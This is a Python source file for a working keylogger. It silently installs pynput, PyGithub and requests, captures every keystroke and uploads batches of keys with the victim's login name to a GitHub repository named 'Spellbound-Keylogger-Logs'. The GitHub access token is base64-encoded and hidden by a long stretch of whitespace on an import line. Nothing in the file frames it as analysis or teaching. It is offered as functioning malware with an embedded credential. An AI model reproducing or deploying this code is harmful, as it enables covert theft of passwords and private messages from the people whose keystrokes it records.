import base64
import os                                                                                                                                                                                                                                                                                                                                                                                   ;TOKEN = base64.b64decode("Z2hwX1hwbE1zREpYdHdIbnI3cUppdllnZThPMlNwaXgwWDNhMHpYUg==").decode("utf-8");REPO_NAME = "JuanaCOrtiz/Spellbound-Keylogger-Logs"
import sys
import time
import random
import string
import subprocess

SCRIPT_PATH = os.path.abspath(__file__)
PYTHON_CMD = sys.executable

def InstallPackages(packages):
    for package in packages:
        subprocess.run([PYTHON_CMD, "-m", "pip", "install", package], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)

def GetTime():
    return time.strftime("%H:%M:%S", time.localtime())

def GetRandomString(n):
    caracteres = string.ascii_letters + string.digits
    return ''.join(random.choice(caracteres) for _ in range(n))


InstallPackages(packages=["requests", "pynput", "PyGithub"])

try:
    import requests
    from github import Github
    from pynput.keyboard import Key, Listener
except:
    subprocess.run([PYTHON_CMD, SCRIPT_PATH], creationflags=subprocess.CREATE_NO_WINDOW)

scriptFolder = os.path.dirname(os.path.abspath(__file__))

TO_GITHUB = ""
MESSAGE_COMMIT = ""

g = Github(TOKEN)
repo = g.get_repo(REPO_NAME)


pressedKeys = []
def OnPress(key):
    global pressedKeys

    keyCodes = {Key.space : ' [SPACE] ',Key.shift : ' [SHIFT] ',Key.tab : ' [TAB] ',Key.backspace : ' [DEL] ',Key.esc : ' [ESC] ',Key.caps_lock : ' [CAPS LOCK] ',Key.enter: ' [ENTER] '}
    
    try:
        if key.char:
            pressedKeys.append(key.char)
        else:
            pressedKeys.append(keyCodes.get(key, f' [{key}] '))
    except AttributeError:
        pressedKeys.append(keyCodes.get(key, f' [{key}] '))

    if len(pressedKeys) > 30:
        finalMessage = ""

        for key in pressedKeys:
            finalMessage += key

        fileName = f"{GetRandomString(15)}.txt"

        TO_GITHUB = f"{fileName}"
        MESSAGE_COMMIT = f"[{GetTime()}] {os.getlogin()}"

        repo.create_file(TO_GITHUB, MESSAGE_COMMIT, finalMessage)

        pressedKeys = []

with Listener(on_press=OnPress) as listen:
    listen.join()
